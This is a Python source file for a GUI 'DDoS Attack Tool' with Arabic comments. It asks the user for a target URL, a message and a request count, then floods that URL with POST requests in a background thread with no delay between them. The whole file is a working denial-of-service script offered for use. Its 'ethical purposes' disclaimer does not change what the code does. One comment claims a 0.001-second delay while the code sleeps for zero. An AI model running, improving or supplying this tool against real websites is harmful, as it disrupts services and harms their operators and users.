import requests
import time
import tkinter as tk
from tkinter import messagebox
import threading

# إعداد النافذة الرئيسية
root = tk.Tk()
root.title("Cyber Tools")
root.iconbitmap('icon.ico')

# جعل الشاشة غير قابلة للامتداد
root.resizable(False, False)

#=========== Title ==============
title = tk.Label(root, text='BY Lord S', font=('courier', 18), bg='black', fg='white')
title1 = tk.Label(root, text='Cyber Tools [ GUI Ddos Attack Tool ] v.1', font=('courier', 18), bg='black', fg='white')
title1.pack(fill=tk.X)
title.pack(fill=tk.X)

# إعداد واجهة المستخدم للهجوم
class DDoSApp(tk.Frame):
    def __init__(self, master):
        super().__init__(master)

        tk.Label(self, text="Requirements", font=('courier', 16)).pack()

        tk.Label(self, text="URL:").pack()
        # زيادة عرض مدخل الـ URL
        self.url_entry = tk.Entry(self, width=70)
        self.url_entry.pack()

        tk.Label(self, text="Message:").pack()
        self.message_entry = tk.Entry(self, width=50)
        self.message_entry.pack()

        # إضافة مساحة بين مدخل الرسالة والزر "Start Attack"
        tk.Label(self, text="").pack()

        tk.Label(self, text="Number of Requests:").pack()
        self.requests_number_entry = tk.Entry(self, width=20)
        self.requests_number_entry.pack()

        # إضافة مساحة بين مدخل عدد الطلبات والزر "Start Attack"
        tk.Label(self, text="").pack()

        self.attack_button = tk.Button(self, text="Start Attack", command=self.start_attack)
        self.attack_button.pack()

        # إضافة مساحة بين الزر "Start Attack" ونص "Copyrights"
        tk.Label(self, text="").pack()

    def start_attack(self):
        # احصل على الرسالة من المستخدم
        message = self.message_entry.get()

        # احصل على عدد الطلبات من المستخدم
        try:
            requests_number = int(self.requests_number_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid number of requests.")
            return

        # احصل على عنوان URL من المستخدم
        url = self.url_entry.get()

        # تعيين متغير لتتبع حالة الهجوم
        self.is_attacking = True

        # إنشاء وتشغيل موضوع جديد للهجوم لتجنب تعليق واجهة المستخدم
        threading.Thread(target=self.perform_attack, args=(url, message, requests_number)).start()

    def perform_attack(self, url, message, requests_number):
        # ابدأ الإرسال
        print("Attack Started ...")
        requests_number_sent = 0
        while self.is_attacking and requests_number_sent < requests_number:
            try:
                requests.post(url, data={"message": message})
                requests_number_sent += 1
                print(f"\033[31mAttack n. \033[39m{requests_number_sent}")

                # تأخير لمدة 0.001 ثانية بين الهجمات
                time.sleep(0)
            except requests.exceptions.RequestException as e:
                print(f"Request Exception: {e}")
                break

        print("\033[32mAttack Completed !\033[39m")
        self.is_attacking = False

# إنشاء واجهة المستخدم لعمليات جمع المعلومات
class InfoGatheringApp(tk.Frame):
    def __init__(self, master):
        super().__init__(master)

        tk.Label(self, text="Copyrights", font=('courier', 16)).pack()
        tk.Label(self, text="This tool is for ethical purposes and may not be used for unethical purposes", font=('courier', 16)).pack()

# إنشاء واجهة المستخدم الرئيسية وضم الواجهتين
if __name__ == "__main__":
    ddos_app = DDoSApp(root)
    info_gathering_app = InfoGatheringApp(root)

    ddos_app.pack()
    info_gathering_app.pack()

    root.mainloop()
